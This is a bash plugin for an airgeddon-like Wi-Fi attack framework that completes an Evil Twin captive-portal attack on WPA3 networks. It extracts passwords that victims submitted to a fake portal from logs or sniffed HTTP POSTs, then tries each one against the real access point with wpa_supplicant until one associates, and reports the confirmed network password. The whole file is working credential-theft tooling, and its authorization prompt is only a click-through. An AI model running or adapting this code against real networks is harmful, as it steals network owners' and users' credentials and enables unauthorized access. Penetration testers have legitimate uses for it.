#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

###### Airsniffer plugin: Captive portal credential verification ######
#
# Completes the Evil Twin captive-portal flow for WPA3-only targets, where a
# password cannot be verified offline. It:
#
#   1) extracts submitted password candidate(s) from a capture - an airgeddon
#      captive-portal log, or a sniffed plaintext HTTP POST body - via
#      portal_verify_engine.py;
#   2) for a WPA3-only target, verifies each candidate by attempting a real
#      association to the legitimate AP (the "active dictionary" path), using a
#      generated wpa_supplicant.conf.
#
# Live association touches the real network, so it is gated behind an
# authorization prompt and a target confirmation. All system calls use argument
# arrays - no shell-string concatenation of captured, attacker-influenced data.
#
# AUTHORIZED USE ONLY.

###### GENERIC PLUGIN VARS ######

plugin_name="Captive portal credential verification"
plugin_description="Extract captured portal passwords and verify them (WPA3-only: via live SAE association)"
plugin_author="Airsniffer"

plugin_enabled=1
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)/airsniffer_ui.sh" 2> /dev/null || true

###### PLUGIN REQUIREMENTS ######

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

###### WPA3 MENU REGISTRATION ######

portal_verify_menu_string_id=9140

portal_verify_plugin_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)"
portal_verify_engine="${portal_verify_plugin_dir}/portal_verify_engine.py"

#Session state.
portal_verify_capture=""
portal_verify_authorized=0

portal_verify_register_labels() {
	local lang
	local label="Captive portal credential verification (WPA3-only live check) *"
	for lang in ENGLISH SPANISH FRENCH CATALAN PORTUGUESE RUSSIAN GREEK ITALIAN POLISH GERMAN TURKISH ARABIC CHINESE; do
		arr["${lang}",${portal_verify_menu_string_id}]="${label}"
	done
}
portal_verify_register_labels

plugin_wpa3_menu_option_function="portal_verify_menu"
plugin_wpa3_menu_option_language_string="${portal_verify_menu_string_id}"

###### HELPERS ######

portal_verify_title() {
	as_ui_header "${1}"
}

portal_verify_pause() {
	as_ui_pause
}

portal_verify_python() {
	if command -v python3 > /dev/null 2>&1; then
		echo "python3"
	elif command -v python > /dev/null 2>&1; then
		echo "python"
	else
		echo ""
	fi
}

#Is the locked target WPA3? Reads Airsniffer's core enc var when present.
portal_verify_is_wpa3() {
	case "${enc^^}" in
		*WPA3*|*SAE*) return 0 ;;
		*) return 1 ;;
	esac
}

portal_verify_authorization_gate() {
	if [ "${portal_verify_authorized}" -eq 1 ]; then
		return 0
	fi
	echo
	echo -e "${red_color}AUTHORIZED TESTING ONLY${normal_color}"
	echo -e "${yellow_color}Live verification associates to the real target network with captured"
	echo -e "credentials. Only do this against a network you are authorized to test.${normal_color}"
	echo
	read -rp "$(echo -e "${green_color}Do you have authorization for this target? [y/N]: ${normal_color}")" _auth
	case "${_auth}" in
		y|Y|yes|YES) portal_verify_authorized=1; return 0 ;;
		*) echo; echo -e "${red_color}Aborted. Authorization is required.${normal_color}"; return 1 ;;
	esac
}

###### SETUP ######

portal_verify_select_capture() {
	echo
	local auto
	auto="$(ls -t "${et_captive_portal_logpath:-}" "${tmpdir:-/tmp/}"*.log "${tmpdir:-/tmp/}"*.txt 2> /dev/null | head -n1)"
	if [ -n "${auto}" ] && [ -f "${auto}" ]; then
		echo -e "${blue_color}Most recent capture/log:${normal_color} ${auto}"
		read -rp "$(echo -e "${green_color}Use it? [Y/n] (or type a path): ${normal_color}")" _answer
		case "${_answer}" in
			""|y|Y|yes|YES) portal_verify_capture="${auto}" ;;
			n|N|no|NO) read -rp "$(echo -e "${green_color}Path to capture: ${normal_color}")" portal_verify_capture ;;
			*) portal_verify_capture="${_answer}" ;;
		esac
	else
		read -rp "$(echo -e "${green_color}Path to portal log / HTTP POST capture: ${normal_color}")" portal_verify_capture
	fi
	if [ -n "${portal_verify_capture}" ] && [ -f "${portal_verify_capture}" ]; then
		echo -e "${green_color}Selected:${normal_color} ${portal_verify_capture}"
	else
		echo -e "${red_color}File not found.${normal_color}"; portal_verify_capture=""
	fi
	portal_verify_pause
}

###### ACTIONS ######

#Extract candidates and show them (read-only).
portal_verify_extract() {
	local py; py="$(portal_verify_python)"
	if [ -z "${py}" ]; then echo -e "${red_color}Python 3 not found.${normal_color}"; portal_verify_pause; return; fi
	if [ ! -f "${portal_verify_engine}" ]; then echo -e "${red_color}Engine not found.${normal_color}"; portal_verify_pause; return; fi
	if [ -z "${portal_verify_capture}" ] || [ ! -f "${portal_verify_capture}" ]; then
		echo -e "${red_color}No capture selected.${normal_color} Use option 1 first."; portal_verify_pause; return
	fi
	if [ -z "${essid}" ]; then
		echo -e "${red_color}No target SSID.${normal_color} Lock a target in the Evil Twin flow first."; portal_verify_pause; return
	fi
	echo
	local args=("${portal_verify_engine}" "${portal_verify_capture}" --ssid "${essid}")
	portal_verify_is_wpa3 && args+=(--wpa3)
	"${py}" "${args[@]}" || echo -e "${red_color}Extraction failed.${normal_color}"
	portal_verify_pause
}

#Live-verify candidates by attempting association to the real AP.
portal_verify_live() {
	local py; py="$(portal_verify_python)"
	if [ -z "${py}" ]; then echo -e "${red_color}Python 3 not found.${normal_color}"; portal_verify_pause; return; fi
	if [ -z "${essid}" ]; then
		echo -e "${red_color}No target SSID.${normal_color}"; portal_verify_pause; return; fi
	if [ -z "${portal_verify_capture}" ] || [ ! -f "${portal_verify_capture}" ]; then
		echo -e "${red_color}No capture selected.${normal_color}"; portal_verify_pause; return; fi
	if [ -z "${interface}" ]; then
		echo -e "${red_color}No interface selected.${normal_color}"; portal_verify_pause; return; fi
	if ! command -v wpa_supplicant > /dev/null 2>&1; then
		echo -e "${red_color}wpa_supplicant not found.${normal_color} Install it to live-verify."; portal_verify_pause; return
	fi
	if ! portal_verify_authorization_gate; then portal_verify_pause; return; fi

	if [ "${ifacemode}" = "Monitor" ]; then
		echo -e "${yellow_color}Interface is in monitor mode; live association needs managed mode.${normal_color}"
		echo -e "Switch ${interface} to managed mode from the main menu first."
		portal_verify_pause; return
	fi

	#Pull the unique candidate passwords as a newline list from the engine.
	local wpa3_flag=()
	portal_verify_is_wpa3 && wpa3_flag=(--wpa3)
	local candidates
	candidates="$("${py}" "${portal_verify_engine}" "${portal_verify_capture}" --ssid "${essid}" "${wpa3_flag[@]}" --json \
		| "${py}" -c 'import json,sys; [print(p) for p in json.load(sys.stdin)["unique_passwords"]]' 2> /dev/null)"

	if [ -z "${candidates}" ]; then
		echo -e "${red_color}No password candidates extracted.${normal_color}"; portal_verify_pause; return
	fi

	local conf found="" cand
	conf="${tmpdir:-/tmp/}portal_verify_wpa.conf"
	while IFS= read -r cand; do
		[ -z "${cand}" ] && continue
		echo -e "${blue_color}Trying:${normal_color} ${cand}"
		#Generate the conf via the engine (handles SAE vs WPA-PSK + quoting).
		"${py}" "${portal_verify_engine}" --ssid "${essid}" "${wpa3_flag[@]}" --emit-conf "${cand}" > "${conf}" 2> /dev/null

		#Attempt association for a few seconds, then check state.
		wpa_supplicant -i "${interface}" -c "${conf}" -B > /dev/null 2>&1
		local ok=0 i
		for i in 1 2 3 4 5 6 7 8; do
			sleep 1
			if wpa_cli -i "${interface}" status 2> /dev/null | grep -q "wpa_state=COMPLETED"; then
				ok=1; break
			fi
		done
		wpa_cli -i "${interface}" terminate > /dev/null 2>&1
		pkill -f "wpa_supplicant -i ${interface} -c ${conf}" > /dev/null 2>&1

		if [ "${ok}" -eq 1 ]; then
			found="${cand}"
			echo -e "${green_color}[VALID]${normal_color} Associated with: ${cand}"
			break
		fi
		echo -e "${yellow_color}[no]${normal_color} ${cand} did not associate"
	done <<< "${candidates}"

	rm -f "${conf}" 2> /dev/null
	echo
	if [ -n "${found}" ]; then
		echo -e "${green_color}Confirmed network password:${normal_color} ${found}"
	else
		echo -e "${red_color}No captured candidate associated successfully.${normal_color}"
	fi
	portal_verify_pause
}

###### SUBMENU ######

portal_verify_menu() {

	while true; do
		clear
		portal_verify_title "Captive portal credential verification"

		local enc_str="${enc:-<unknown>}"
		if [ -n "${essid}" ]; then
			as_ui_kv "Target SSID" "${essid} (${enc_str})" ok
		else
			as_ui_kv "Target SSID" "<none - lock a target>" err
		fi
		as_ui_kv "Interface" "${interface:-<none>} [${ifacemode:-Managed}]" info
		as_ui_kv "Capture" "${portal_verify_capture:-<none>}" info
		echo
		as_ui_sep
		as_ui_item 0 "Return to the WPA3 attacks menu"
		as_ui_section "Credential verification"
		as_ui_item 1 "Select capture (portal log / HTTP POST)"
		as_ui_item 2 "Extract captured password candidate(s)"
		as_ui_item 3 "Live-verify candidates (associate to real AP)"
		echo

		read -rp "> " pv_option
		case "${pv_option}" in
			0) return ;;
			1) portal_verify_select_capture ;;
			2) portal_verify_extract ;;
			3) portal_verify_live ;;
			*) echo -e "${red_color}Invalid option.${normal_color}"; sleep 1 ;;
		esac
	done
}
